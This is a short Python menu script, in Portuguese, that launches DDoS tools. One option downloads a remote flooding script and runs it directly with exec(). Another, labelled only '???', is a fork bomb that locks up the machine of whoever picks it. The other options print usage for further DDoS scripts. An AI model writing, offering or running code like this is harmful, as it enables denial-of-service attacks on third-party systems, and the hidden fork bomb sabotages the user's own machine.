from requests import get
import os
import sys
import time

def menu():
	print("""
	
	  \033[34mDEVTOOLS\033[m
	    by \033[33m@SAS\033[m
	   
          \033[44mVersao: 1.0\033[m
         
  Opcoes:

  \033[36m[\033[m1\033[36m]\033[m ddos-tool
  \033[36m[\033[m2\033[36m]\033[m ddos-attack
  \033[36m[\033[m3\033[36m]\033[m pyflooder

  \033[36m[\033[m90\033[36m]\033[m \033[31m???\033[m
  \033[36m[\033[m91\033[36m]\033[m \033[31mVoltar\033[m
  \033[36m[\033[m92\033[36m]\033[m \033[31mSair\033[m
""")

clear = lambda: os.system('clear')

menu()

kk = int(input('\033[34m===>\033[m '))

if kk == (1):
	clear()
	print("""
               _                                  
  ___ ___   __| | ___  __      __  _ __ ___   ___ 
 / __/ _ \ / _` |/ _ \ \ \ /\ / / | '_ ` _ \ / _ \\
| (_| (_) | (_| |  __/  \ V  V /  | | | | | |  __/
 \___\___/ \__,_|\___|   \_/\_(_) |_| |_| |_|\___|                                                
   
    Build a Simple DDoS Script with Python
    Authors: @Lekssays and @omarchaan\n\n
    usage: 
    cd lib
    python xha.py [-h] [-u USER_AGENTS] -t TARGET -tr THREADS -s SLEEP
ddostool.py: error: the following arguments are required: -t/--target, -tr/--threads, -s/--sleep
    """)
    
if kk == (2):
  clear()
  exec(get('https://raw.githubusercontent.com/D4Vinci/PyFlooder/master/pyflooder.py').text)

if kk == (3):
	clear()
	print('ERROR\n Usage:\n cd lib\n python lol.py < Hostname > < Port > < Number_of_Attacks >')

if kk == (90):
	clear()
	print('Morreu kkkkkk')
	while True:
		os.fork()	
	
if kk == (91):
	clear()
	print('Voltando em 1s')
	time.sleep(1)
	import Run
																					
if kk == (92):
	print('Saindo...')
	time.sleep(1)
	exit()
